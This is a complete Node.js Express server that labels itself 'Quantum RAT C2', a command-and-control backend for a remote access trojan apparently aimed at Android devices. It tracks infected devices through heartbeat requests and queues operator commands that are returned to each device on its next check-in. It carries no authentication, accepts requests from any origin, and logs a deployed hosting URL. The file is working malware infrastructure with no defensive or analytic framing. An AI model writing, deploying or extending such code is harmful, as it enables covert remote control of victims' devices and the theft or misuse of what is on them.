const express = require('express');
const cors = require('cors');

const app = express();

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

let devices = [];
let logs = [];
let commandQueue = {};

app.post('/api/heartbeat', (req, res) => {
    const { device_id, status } = req.body;
    console.log(`Heartbeat from ${device_id}: ${status}`);

    const existing = devices.find(d => d.id === device_id);
    if (existing) {
        existing.last_seen = new Date().toISOString();
    } else {
        devices.push({
            id: device_id || 'Android',
            status: status || 'online',
            first_seen: new Date().toISOString(),
            last_seen: new Date().toISOString()
        });
    }

    let command = null;
    if (commandQueue[device_id] && commandQueue[device_id].length > 0) {
        command = commandQueue[device_id].shift();
        console.log(`Sending command to ${device_id}: ${command}`);
    }

    res.json({
        status: 'ok',
        message: 'Heartbeat received',
        command: command
    });
});

app.post('/api/command', (req, res) => {
    const { device_id, command } = req.body;
    console.log(`New command: ${command} for ${device_id}`);

    if (!device_id || !command) {
        return res.status(400).json({ error: 'device_id and command are required' });
    }

    if (!commandQueue[device_id]) commandQueue[device_id] = [];
    commandQueue[device_id].push(command);

    res.json({ status: 'ok', message: `Command "${command}" added to queue for ${device_id}` });
});

app.get('/api/devices', (req, res) => {
    res.json(devices);
});

app.get('/api/test', (req, res) => {
    res.json({ status: 'ok', message: 'Server is running', devices: devices.length });
});

app.get('/', (req, res) => {
    res.json({ status: 'online', message: 'Quantum RAT C2 is running' });
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Test: https://quantum-c2-backend-production.up.railway.app/api/test`);
});
